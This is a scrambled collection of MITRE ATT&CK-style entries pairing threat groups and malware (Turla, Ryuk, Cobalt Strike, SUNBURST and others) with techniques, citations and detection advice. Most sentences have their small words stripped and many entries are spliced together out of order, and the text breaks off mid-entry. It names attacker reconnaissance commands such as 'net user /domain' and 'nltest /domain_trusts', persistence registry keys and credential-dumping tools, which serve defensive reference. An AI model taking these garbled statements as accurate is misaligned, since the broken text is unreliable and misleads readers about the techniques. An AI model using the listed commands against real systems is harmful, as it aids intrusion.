[Elderwood](https://attack.mitre.org/groups/G0066) packed malware payloads delivery victims.(Citation: Symantec Elderwood Sept 2012) [Lucifer](https://attack.mitre.org/software/S0532) check existing stratum cryptomining <code>HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr – %stratum info%</code>.(Citation: Unit 42 Lucifer June 2020) [Denis](https://attack.mitre.org/software/S0354) launch remote execute arbitrary commands victim’s machine.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) Monitor events account objects permissions systems domain, event IDs 4738, 4728 4670. Monitor modification accounts correlation suspicious activity. occur unusual times unusual systems. flag events subject target accounts include additional flags changing password knowledge password.

Monitor unusual permissions excessively broad permissions granted compromised accounts. [Siloscape](https://attack.mitre.org/software/S0623) native API calls.(Citation: Unit 42 Siloscape Jun 2021) [TA505](https://attack.mitre.org/groups/G0092) communicate C2 nodes.(Citation: IBM TA505 April 2020) [Ecipekac](https://attack.mitre.org/software/S0624) ability decrypt fileless loader modules.(Citation: Securelist APT10 March 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. [Taidoor](https://attack.mitre.org/software/S0011) modified <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> key persistence.(Citation: TrendMicro Taidoor) [BBK](https://attack.mitre.org/software/S0470) ability <code>CreatePipe</code> API add sub-process execution [cmd](https://attack.mitre.org/software/S0106).(Citation: Trend Micro Tick November 2019) [Machete](https://attack.mitre.org/software/S0409) capability exfiltrate stolen data hidden folder removable drive.(Citation: ESET Machete July 2019) [Bazar](https://attack.mitre.org/software/S0534) variant packed payload.(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020) [HAFNIUM](https://attack.mitre.org/groups/G0125) ASCII encoding C2 traffic.(Citation: HAFNIUM March 2020) [FIN8](https://attack.mitre.org/groups/G0061) deleted Registry post compromise cleanup activities.(Citation: FireEye Enemy FIN8 Aug 2016) [Hildegard](https://attack.mitre.org/software/S0601) scripts execution.(Citation: Unit 42 Hildegard Malware) Monitor files accessed search local file systems remote file shares files insecurely stored credentials. detecting adversaries accessing files difficult knowing exist place, detect adversary credentials obtained.  [Cobalt Group](https://attack.mitre.org/groups/G0080) persistence registering file stage malware <code>HKCU\Environment\UserInitMprLogonScript</code>.(Citation: Morphisec Cobalt Gang Oct 2018) Monitor configuring alerting notify activity unused regions instances active region threshold. [LitePower](https://attack.mitre.org/software/S0680) ability list local drives enumerate OS architecture.(Citation: Kaspersky WIRTE November 2021) [Turla](https://attack.mitre.org/groups/G0010) <code>net accounts</code> <code>net accounts /domain</code> acquire password policy information.(Citation: ESET ComRAT 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) Window Remote Management laterally victim network.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020) Monitor unusual/suspicious driver activity, EDR drivers security tools abused disable security products. [Chimera](https://attack.mitre.org/groups/G0114) remotely copied tools malware targeted systems.(Citation: Cycraft Chimera April 2020) [Rising Sun](https://attack.mitre.org/software/S0448) detect network adapter IP address information.(Citation: McAfee Sharpshooter December 2018)	 [FIN8](https://attack.mitre.org/groups/G0061) malicious framework designed impersonate lsass.exe/vmtoolsd.exe token.(Citation: Bitdefender FIN8 July 2021) [Zebrocy](https://attack.mitre.org/software/S0251) command create scheduled task persistence.(Citation: CISA Zebrocy Oct 2020) (Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017) [BADCALL](https://attack.mitre.org/software/S0245) collects network adapter information.(Citation: US-CERT BADCALL) [FLASHFLOOD](https://attack.mitre.org/software/S0036) employs encoding scheme [SPACESHIP](https://attack.mitre.org/software/S0035) data stages. Data compressed zlib, bytes rotated times XOR'ed 0x23.(Citation: FireEye APT30) [Ramsay](https://attack.mitre.org/software/S0458) insert address space applications AppInit DLL Registry key.(Citation: Eset Ramsay 2020)	 [SDBbot](https://attack.mitre.org/software/S0461) ability delete files compromised host.(Citation: Proofpoint TA505 October 2019) Monitor newly constructed user accounts account audits detect suspicious accounts created adversary. Collect data account creation network Windows Event 4720 (for user account created Windows domain controller). [SUNBURST](https://attack.mitre.org/software/S0559) dynamically resolved C2 infrastructure randomly-generated subdomains parent domain.(Citation: FireEye SUNBURST Backdoor December 2020) [DustySky](https://attack.mitre.org/software/S0062) scans victim files keywords document types including PDF, DOC, DOCX, XLS, XLSX, list C2 file. identify logical drives infected machine.(Citation: DustySky)(Citation: Kaspersky MoleRATs April 2019) Monitor contextual data firewall activity name, policy, status [RTM](https://attack.mitre.org/software/S0148) delivered archived Windows executable files masquerading PDF documents.(Citation: Unit42 Redaman January 2019)	 [Windigo](https://attack.mitre.org/groups/G0124) distributed Windows malware drive-by downloads.(Citation: ESET Windigo Mar 2014) [yty](https://attack.mitre.org/software/S0248) runs <code>ipconfig /all</code> collects domain name.(Citation: ASERT Donot March 2018) [UNC2452](https://attack.mitre.org/groups/G0118) configured instance [Cobalt Strike](https://attack.mitre.org/software/S0154) network pipe SMB 2020 SolarWinds intrusion.(Citation: Symantec RAINDROP January 2021) [Ember Bear](https://attack.mitre.org/groups/G1003) attempted lure users malicious link spearphishing email.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) (Citation: Kaspersky Winnti April 2013) Ensure low-privileged user accounts permissions add permissions accounts update IAM policies. [AuditCred](https://attack.mitre.org/software/S0347) encrypts configuration.(Citation: TrendMicro Lazarus Nov 2018) [Conti](https://attack.mitre.org/software/S0575) API calls execution.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)  [AppleJeus](https://attack.mitre.org/software/S0584) plist file <code>LaunchDaemons</code> folder launched manually.(Citation: CISA AppleJeus Feb 2021)(Citation: ObjectiveSee AppleJeus 2019) [BoomBox](https://attack.mitre.org/software/S0635) execute LDAP query discover e-mail accounts domain users.(Citation: MSTIC Nobelium Toolset 2021) [Carbanak](https://attack.mitre.org/groups/G0008) open-source tools [PsExec](https://attack.mitre.org/software/S0029) [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Kaspersky Carbanak) [Meteor](https://attack.mitre.org/software/S0688) policy push scheduled task network machines.(Citation: Check Meteor Aug 2021) [CaddyWiper](https://attack.mitre.org/software/S0693) ability destroy physical drive's partitions including MBR, GPT, partition entries.(Citation: ESET CaddyWiper March 2022)(Citation: Cisco CaddyWiper March 2022) [Cannon](https://attack.mitre.org/software/S0351) gather victim’s machine OS version, machine name, drive information.(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018) [MESSAGETAP](https://attack.mitre.org/software/S0443) checks existence configuration files (keyword_parm.txt parm.txt) attempts read files 30 seconds.(Citation: FireEye MESSAGETAP October 2019) [APT1](https://attack.mitre.org/groups/G0006) commands <code>net start</code> <code>tasklist</code> listing services system.(Citation: Mandiant APT1) [BADNEWS](https://attack.mitre.org/software/S0128) checks hard drives victim, USB devices, listening WM_DEVICECHANGE window message.(Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) (Citation: Crowdstrike EvilCorp March 2021) Monitoring Windows Registry reveal malicious attempts modify trust settings, installation root certificates. Installed root certificates located Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and </code>[HKLM HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. subset root certificates consistent Windows systems comparison: (Citation: Tripwire AppUNBlocker) enabling Registry Global Object Access Auditing (Citation: Registry Auditing Aug 2016) setting Advanced Security Audit policy apply global access control list (SACL) event auditing modifications Registry values (sub)keys SIPs trust providers:(Citation: Audit Registry July 2012)  [Wizard Spider](https://attack.mitre.org/groups/G0102) injected malicious DLLs memory read, write, execute permissions.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020) Monitor newly constructed network connections received untrusted hosts.  [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors installed [Rising Sun](https://attack.mitre.org/software/S0448) Startup folder disguised `mssync.exe`.(Citation: McAfee Sharpshooter December 2018) application control mitigate installation unapproved virtualization software. implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [Threat Group-3390](https://attack.mitre.org/groups/G0027) exploited MS17-010 laterally systems network.(Citation: Unit42 Emissary Panda 2019)	 Ensure local administrator accounts complex, unique passwords systems network. [PoshC2](https://attack.mitre.org/software/S0378) module packet captures compromised hosts.(Citation: GitHub PoshC2) [Anchor](https://attack.mitre.org/software/S0504) secondary C2 servers communication establishing connectivity relaying victim primary C2 servers.(Citation: Cyberreason Anchor December 2019) Ensure endpoint defenses safe mode.(Citation: CyberArk Labs Safe Mode 2016) [Felismus](https://attack.mitre.org/software/S0171) samples custom encryption method C2 traffic utilizes AES multiple keys.(Citation: Forcepoint Felismus Mar 2017) [Ryuk](https://attack.mitre.org/software/S0446) attempted adjust token privileges <code>SeDebugPrivilege</code>.(Citation: CrowdStrike Ryuk January 2019) [StreamEx](https://attack.mitre.org/software/S0142) ability remotely execute commands.(Citation: Cylance Crew Feb 2017) (Citation: McAfee Bankshot) [Cuba](https://attack.mitre.org/software/S0625) executed hidden PowerShell windows.(Citation: McAfee Cuba April 2021)  [Action RAT](https://attack.mitre.org/software/S1028) collect local data infected machine.(Citation: MalwareBytes SideCopy Dec 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors copied files company servers subsequently downloaded them.(Citation: McAfee Night Dragon) [Volgmer](https://attack.mitre.org/software/S0180) delete files infection avoid analysis.(Citation: US-CERT Volgmer 2 Nov 2017) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) <code>net user /domain</code> identify account information.(Citation: Secureworks BRONZE BUTLER Oct 2017) [Penquin](https://attack.mitre.org/software/S0587) encrypted strings binary obfuscation.(Citation: Leonardo Turla Penquin 2020) (Citation: Unit 42 RGDoor Jan 2018) [Higaisa](https://attack.mitre.org/groups/G0126) certutil decode Base64 binaries runtime 16-byte XOR key decrypt data.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) [InvisiMole](https://attack.mitre.org/software/S0260) installed legitimate vulnerable Total Video Player software wdigest.dll library drivers compromised hosts exploit stack overflow input validation vulnerabilities code execution.(Citation: ESET InvisiMole June 2020) Monitor loading execution artifacts PowerShell specific assemblies, System.Management.Automation.dll (especially unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) [Pupy](https://attack.mitre.org/software/S0192) list running processes process parent process’s ID.(Citation: GitHub Pupy) [Nidiran](https://attack.mitre.org/software/S0118) create service named msamger (Microsoft Security Accounts Manager).(Citation: Symantec Backdoor.Nidiran) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors communicated C2 encrypted RC4 byte stream AES-CBC.(Citation: Talos Frankenstein June 2019) [Conficker](https://attack.mitre.org/software/S0608) downloads server infected machine.(Citation: SANS Conficker) [Nebulae](https://attack.mitre.org/software/S0630) RC4 XOR encrypt C2 communications.(Citation: Bitdefender Naikon April 2021) [FinFisher](https://attack.mitre.org/software/S0182) <code>KernelCallbackTable</code> hijack execution flow process replacing <code>__fnDWORD</code> function address created [Asynchronous Procedure Call](https://attack.mitre.org/techniques/T1055/004) stub routine.(Citation: FinFisher exposed ) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover files specific locations hard disk %TEMP% directory, current user's desktop, Program Files directory, Recent.(Citation: Kaspersky Turla)(Citation: ESET ComRAT 2020) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors searched files matching <code>lPH*.dll</code> pattern.(Citation: ESET Turla PowerShell 2019) [Rocke](https://attack.mitre.org/groups/G0106) spread coinminer SSH.(Citation: Anomali Rocke March 2019)	 [Leviathan](https://attack.mitre.org/groups/G0065) external remote services virtual private networks (VPN) gain initial access.(Citation: CISA AA21-200A APT40 July 2021) Monitor services unexpected modifications names, descriptions, start types [Orz](https://attack.mitre.org/software/S0229) strings base64 encoded, embedded DLL MockDll.(Citation: Proofpoint Leviathan Oct 2017) [Dragonfly](https://attack.mitre.org/groups/G0035) batch scripts enumerate users victim domain controller.(Citation: US-CERT TA18-074A) [PowerSploit](https://attack.mitre.org/software/S0194) collection Exfiltration modules harvest credentials [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [HotCroissant](https://attack.mitre.org/software/S0431) attempted install scheduled task named “Java Maintenance64” startup establish persistence.(Citation: Carbon Black HotCroissant April 2020) [FELIXROOT](https://attack.mitre.org/software/S0267) deletes .LNK file startup directory dropper components.(Citation: FireEye FELIXROOT July 2018) [GuLoader](https://attack.mitre.org/software/S0561) executable retrieved embedded macros malicious Word documents.(Citation: Unit 42 NETWIRE April 2020) [Aria-body](https://attack.mitre.org/software/S0456) ZIP compress data gathered compromised host.(Citation: CheckPoint Naikon 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) GitHub repositories downloaders group's .NET executable compromised system.(Citation: ESET Gamaredon June 2020)	 [ShadowPad](https://attack.mitre.org/software/S0596) injected DLL svchost.exe.(Citation: Kaspersky ShadowPad Aug 2017) [APT39](https://attack.mitre.org/groups/G0087) SMB lateral movement.(Citation: Symantec Chafer February 2018) [Threat Group-3390](https://attack.mitre.org/groups/G0027) moved staged encrypted archives Internet-facing servers compromised [China Chopper](https://attack.mitre.org/software/S0020) prior exfiltration.(Citation: SecureWorks BRONZE UNION June 2017) multi-factor authentication user privileged accounts. embedded network devices support TACACS+ RADIUS.  Follow vendor prescribed practices hardening access control. (Citation: Cisco IOS Software Integrity Assurance - TACACS) [Gelsemium](https://attack.mitre.org/software/S0666) `IARPUinstallerStringLauncher` interface UAC bypass process.(Citation: ESET Gelsemium June 2021) Ensure SSH key pairs strong passwords refrain key-store technologies ssh-agent properly protected. (Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019)(Citation: Gigamon Berserk Bear October 2021) [AADInternals](https://attack.mitre.org/software/S0677) modify registry setting pass-through authentication agent.(Citation: AADInternals Documentation) Monitor unexpected disk partition table entries, blocks unusual memory warrant deeper investigation [Sandworm Team](https://attack.mitre.org/groups/G0034) disabled event logging compromised systems.(Citation: Dragos Crashoverride 2018) [QakBot](https://attack.mitre.org/software/S0650) ability modify Registry add binaries Windows Defender exclusion list.(Citation: IB Ransomware September 2020) (Citation: MSTIC Nobelium Toolset 2021) Establish organizational policy prohibits password storage files. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors disabled anti-virus anti-spyware tools instances victim’s machines. actors disabled proxy settings direct communication victims Internet.(Citation: McAfee Night Dragon) [APT39](https://attack.mitre.org/groups/G0087) SQL injection initial compromise.(Citation: Symantec Chafer February 2018) [InvisiMole](https://attack.mitre.org/software/S0260) disguised droppers legitimate software documents, matching original names locations, saved files mpr.dll Windows folder.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Monitor newly constructed network connections untrusted hosts send receive data.  [Sandworm Team](https://attack.mitre.org/groups/G0034) researched Ukraine's unique legal entity identifier (called "EDRPOU" number), including running queries EDRPOU website, preparation [NotPetya](https://attack.mitre.org/software/S0368) attack. [Sandworm Team](https://attack.mitre.org/groups/G0034) researched third-party websites craft credible spearphishing emails.(Citation: District Court Indictment GRU Unit 74455 October 2020) [FunnyDream](https://attack.mitre.org/software/S1044) delete files including dropper component.(Citation: Bitdefender FunnyDream Campaign November 2020) [PoetRAT](https://attack.mitre.org/software/S0428) Python tool named klog.exe keylogging.(Citation: Talos PoetRAT April 2020) [Attor](https://attack.mitre.org/software/S0438) monitors disk space system.(Citation: ESET Attor Oct 2019) [WannaCry](https://attack.mitre.org/software/S0366) creates service "mssecsvc2.0" display "Microsoft Security Center (2.0) Service."(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access manipulate backups. [Axiom](https://attack.mitre.org/groups/G0001) dump credentials.(Citation: Novetta-Axiom) (Citation: DustySky)(Citation: DustySky2)(Citation: FireEye Operation Molerats) [njRAT](https://attack.mitre.org/software/S0385) launch command interface executing commands.(Citation: Fidelis njRAT June 2013) collecting documents removable media, [Prikormka](https://attack.mitre.org/software/S0113) compresses collected files, encrypts Blowfish.(Citation: ESET Operation Groundbait) [OceanSalt](https://attack.mitre.org/software/S0346) delivered spearphishing emails Office attachments.(Citation: McAfee Oceansalt Oct 2018) [Carberp](https://attack.mitre.org/software/S0484)'s passw.plug plugin gather passwords saved Opera, Internet Explorer, Safari, Firefox, Chrome.(Citation: Prevx Carberp March 2011) [Gallmaker](https://attack.mitre.org/groups/G0084) emails malicious Office documents attached.(Citation: Symantec Gallmaker Oct 2018) [Hikit](https://attack.mitre.org/software/S0009) ability download files compromised host.(Citation: Novetta-Axiom) [Tonto Team](https://attack.mitre.org/groups/G0131) downloaded malicious DLLs served [ShadowPad](https://attack.mitre.org/software/S0596) loader.(Citation: ESET Exchange Mar 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [CrackMapExec](https://attack.mitre.org/software/S0488) brute force supplied user credentials network range.(Citation: CME Github September 2018) [Ngrok](https://attack.mitre.org/software/S0508) threat actors proxy C2 connections ngrok service subdomains.(Citation: Zdnet Ngrok September 2018) [S-Type](https://attack.mitre.org/software/S0085) command `net user` victim.(Citation: Cylance Dust Storm) (Citation: FireEye APT41 Aug 2019) [ZLib](https://attack.mitre.org/software/S0086) communicates C2.(Citation: Cylance Dust Storm) Monitor newly constructed files modify client software binaries establish persistent access systems. [Empire](https://attack.mitre.org/software/S0363) includes modules attempt bypass UAC escalation privileges.(Citation: Github PowerShell Empire) [Unknown Logger](https://attack.mitre.org/software/S0130) functionality disable security tools, including Kaspersky, BitDefender, MalwareBytes.(Citation: Forcepoint Monsoon) Limit service accounts minimal required privileges, including membership privileged Domain Administrators.(Citation: AdSecurity Cracking Kerberos Dec 2015) [AdFind](https://attack.mitre.org/software/S0552) enumerate domain users.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk Trickbot January 2019)(Citation: Cybereason Bumblebee August 2022)(Citation: Symantec Bumblebee June 2022) [Kwampirs](https://attack.mitre.org/software/S0236) collects list users belonging local users administrators commands <code>net localgroup administrators</code> <code>net localgroup users</code>.(Citation: Symantec Orangeworm April 2018) [TrickBot](https://attack.mitre.org/software/S0266) email Excel sheet malicious macro deploy malware(Citation: TrendMicro Trickbot Feb 2019) (Citation: ESET LoJax Sept 2018) [Janicab](https://attack.mitre.org/software/S0163) valid AppleDeveloperID sign code security restrictions.(Citation: Janicab) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor executed commands arguments employ detect avoid debugged environments. Detecting actions debugger identification difficult depending adversary's implementation monitoring required. Monitor unusual processes internal network connections creating files on-system suspicious [Goopy](https://attack.mitre.org/software/S0477) characters padded malicious DLL payload.(Citation: Cybereason Cobalt Kitty 2017) [cmd](https://attack.mitre.org/software/S0106) execute programs actions command-line interface.(Citation: TechNet Cmd) [RCSession](https://attack.mitre.org/software/S0662) `cmd.exe` execution compromised hosts.(Citation: Trend Micro DRBControl February 2020) (Citation: Dell TG-3390) exploitation [LOWBALL](https://attack.mitre.org/software/S0042) malware, [admin@338](https://attack.mitre.org/groups/G0018) actors created file list commands executed compromised computer.(Citation: FireEye admin@338) [OilRig](https://attack.mitre.org/groups/G0049) tested malware samples determine AV detection subsequently modified samples ensure AV evasion.(Citation: Palo Alto OilRig April 2017)(Citation: Unit42 OilRig Nov 2018) [APT28](https://attack.mitre.org/groups/G0007) perform brute force attacks credentials.(Citation: TrendMicro Pawn Storm 2019)(Citation: TrendMicro Pawn Storm Dec 2020)(Citation: Targeting Elections September 2020) [Babuk](https://attack.mitre.org/software/S0638) ability enumerate files targeted system.(Citation: McAfee Babuk February 2021)(Citation: Trend Micro Ransomware February 2021) Monitor newly executed processes gather time time zone local remote system. [cmd](https://attack.mitre.org/software/S0106) files to/from remotely connected internal system.(Citation: TechNet Copy) process monitoring monitor execution arguments regsvr32.exe. Compare invocations regsvr32.exe prior history arguments loaded files determine anomalous adversarial activity. Disallow loading remote DLLs. (Citation: DLL Preloading) included default Windows Server 2012+ patch XP+ Server 2003+. (Citation: DLL Search) Path Algorithm

Enable Safe DLL Search Mode force search DLLs directories restrictions (e.g. <code>%SYSTEMROOT%</code>)to local directory DLLs (e.g. user's directory)

The Safe DLL Search Mode enabled Policy Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. Windows Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode</code> (Citation: DLL Search) [Machete](https://attack.mitre.org/software/S0409) captures screenshots.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) [Lucifer](https://attack.mitre.org/software/S0532) WMI log remote machines propagation.(Citation: Unit 42 Lucifer June 2020) Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. [ZLib](https://attack.mitre.org/software/S0086) mimics resource version legitimate Realtek Semiconductor, Nvidia, Synaptics modules.(Citation: Cylance Dust Storm) [Rclone](https://attack.mitre.org/software/S1040) exfiltrate data FTP HTTP, including WebDAV.(Citation: Rclone) [GreyEnergy](https://attack.mitre.org/software/S0342) encrypts configuration files AES-256 encrypts strings.(Citation: ESET GreyEnergy Oct 2018) (Citation: CISA AA20-301A Kimsuky)(Citation: Cybereason Kimsuky November 2020)(Citation: Crowdstrike GTR2020 Mar 2020) [CosmicDuke](https://attack.mitre.org/software/S0050) custom version RC4 algorithm includes programming error.(Citation: F-Secure Cosmicduke) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Limit domain admin account permissions domain controllers limited servers. Delegate admin functions separate accounts.

Limit service accounts minimal required privileges, including membership privileged Domain Administrators.(Citation: AdSecurity Cracking Kerberos Dec 2015) [Bundlore](https://attack.mitre.org/software/S0482) requests C2.(Citation: MacKeeper Bundlore Apr 2019) [Bazar](https://attack.mitre.org/software/S0534) implement DGA current seed variable.(Citation: Cybereason Bazar July 2020) [Javali](https://attack.mitre.org/software/S0528) embedded VBScript download malicious payloads C2.(Citation: Securelist Brazilian Banking Malware July 2020) [Sibot](https://attack.mitre.org/software/S0589) communicated C2 server requests.(Citation: MSTIC NOBELIUM Mar 2021) [HotCroissant](https://attack.mitre.org/software/S0431) ability hide window operations performed file.(Citation: Carbon Black HotCroissant April 2020) [Leviathan](https://attack.mitre.org/groups/G0065) publicly tools dump password hashes, including [HOMEFRY](https://attack.mitre.org/software/S0232).(Citation: FireEye APT40 March 2019) [PoshC2](https://attack.mitre.org/software/S0378) ability persist WMI events.(Citation: GitHub PoshC2) [SILENTTRINITY](https://attack.mitre.org/software/S0692) collect compromised host, including OS version list drives.(Citation: GitHub SILENTTRINITY Modules July 2019) [FatDuke](https://attack.mitre.org/software/S0512) decrypt AES encrypted C2 communications.(Citation: ESET Dukes October 2019) [AppleJeus](https://attack.mitre.org/software/S0584)'s spearphishing links required user interaction navigate malicious website.(Citation: CISA AppleJeus Feb 2021) [Shark](https://attack.mitre.org/software/S1019) send DNS C2 communications unique domain generation algorithm.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [OopsIE](https://attack.mitre.org/software/S0264) upload files victim's machine C2 server.(Citation: Unit 42 OopsIE! Feb 2018) [IcedID](https://attack.mitre.org/software/S0483) SSL TLS communications C2.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020) [China Chopper](https://attack.mitre.org/software/S0020)'s server component list directory contents.(Citation: FireEye Periscope March 2018) [UNC2452](https://attack.mitre.org/groups/G0118) <code>AUDITPOL</code> prevent collection audit logs.(Citation: Deep Dive Solorigate January 2021) [Doki](https://attack.mitre.org/software/S0600) searched current process’s PID.(Citation: Intezer Doki July 20) Suspicious systemd timers identified comparing trusted baseline. Malicious systemd timers detected systemctl utility examine wide timers: systemctl list-timers –all. Analyze contents .service files file ensure refer legitimate, expected executables. [SslMM](https://attack.mitre.org/software/S0058) sends hard-coded C2, including OS version, service pack information, processor speed, name, OS install date.(Citation: Baumgartner Naikon 2015) [Ursnif](https://attack.mitre.org/software/S0386) copied infected removable drives propagation.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro Ursnif File Dec 2014) [Ebury](https://attack.mitre.org/software/S0377) DGA generate domain C2.(Citation: ESET Ebury Feb 2014)(Citation: ESET Ebury Oct 2017) [Pysa](https://attack.mitre.org/software/S0583) deleted batch files execution. (Citation: CERT-FR PYSA April 2020)  [Kimsuky](https://attack.mitre.org/groups/G0094) tools MailFetch mail crawler collect victim emails (excluding spam) online services IMAP.(Citation: KISA Operation Muzabi) [JSS Loader](https://attack.mitre.org/software/S0648) executed malicious attachments contained spearphishing emails.(Citation: eSentire FIN7 July 2021) (Citation: CrowdStrike Grim Spider 2019)(Citation: FireEye KEGTAP SINGLEMALT October 2020) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create Launch Daemons. [FunnyDream](https://attack.mitre.org/software/S1044) identify files .doc, .docx, .ppt, .pptx, .xls, .xlsx, .pdf extensions specific timestamps collection.(Citation: Bitdefender FunnyDream Campaign November 2020) [APT1](https://attack.mitre.org/groups/G0006) RDP operations.(Citation: FireEye PLA) 
Manage access control list “Replicating Directory Changes” permissions domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Replication ACL) adding users "Protected Users" Active Directory security group. limit caching users' plaintext credentials.(Citation: Protected Users Security Group) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors command `nltest /domain_trusts /all_trusts` enumerate domain trusts.(Citation: DFIR Conti Bazar Nov 2021) [HOMEFRY](https://attack.mitre.org/software/S0232) command-line interface.(Citation: FireEye Periscope March 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) tools identify user compromised host.(Citation: ATT Sidewinder January 2021) [XAgentOSX](https://attack.mitre.org/software/S0161) execFile function execute file NSTask:launch method.(Citation: XAgentOSX 2017) [Avenger](https://attack.mitre.org/software/S0473) ability identify host volume OS architecture compromised host.(Citation: Trend Micro Tick November 2019) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) collected list files victim uploaded C2 server, created list specific files steal.(Citation: Secureworks BRONZE BUTLER Oct 2017) [QUADAGENT](https://attack.mitre.org/software/S0269) gathers victim username.(Citation: Unit 42 QUADAGENT July 2018) [Xbash](https://attack.mitre.org/software/S0341) hosted Pastebin update C2 domain list.(Citation: Unit42 Xbash Sept 2018) [Kazuar](https://attack.mitre.org/software/S0265) adds .lnk file Windows startup folder.(Citation: Unit 42 Kazuar 2017) [LAPSUS$](https://attack.mitre.org/groups/G1004) replayed stolen session token passwords trigger simple-approval MFA prompts hope legitimate user grant approval.(Citation: MSTIC DEV-0537 Mar 2022) Monitor newly constructed files removable media [Attor](https://attack.mitre.org/software/S0438) registry performed query searches.(Citation: ESET Attor Oct 2019) [Janicab](https://attack.mitre.org/software/S0163) captured screenshots C2 server.(Citation: f-secure janicab)(Citation: Janicab) (Citation: US-CERT TA18-074A) (Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Symantec Tick Apr 2016) (Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Avira Mustang Panda January 2020)(Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 Europe March 2022) [MuddyWater](https://attack.mitre.org/groups/G0069) performed credential dumping [LaZagne](https://attack.mitre.org/software/S0349).(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018) (Citation: FireEye APT41 March 2020) Ensure valid password filters registered. Filter DLLs Windows installation directory (`C:\Windows\System32\` default) domain controller local entry `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`.  [Cobalt Strike](https://attack.mitre.org/software/S0154) command-line interface interact systems.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) Monitor calls <code>ZwSetEaFile</code> <code>ZwQueryEaFile</code> Windows API functions binaries interact EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) regularly scanning presence modified information. (Citation: SpectorOps Host-Based Jul 2017) [FunnyDream](https://attack.mitre.org/software/S1044) communicate C2 TCP UDP.(Citation: Bitdefender FunnyDream Campaign November 2020) [BabyShark](https://attack.mitre.org/software/S0414) cmd.exe execute commands.(Citation: Unit42 BabyShark Feb 2019)	 [Nomadic Octopus](https://attack.mitre.org/groups/G0133) PowerShell execution.(Citation: ESET Nomadic Octopus 2018)  Monitor contextual data scheduled job, include name, timing, command(s), etc. (Citation: Symantec Elfin Mar 2019) (Citation: FireEye APT30) [APT37](https://attack.mitre.org/groups/G0067) access destructive malware capable overwriting machine's Master Boot Record 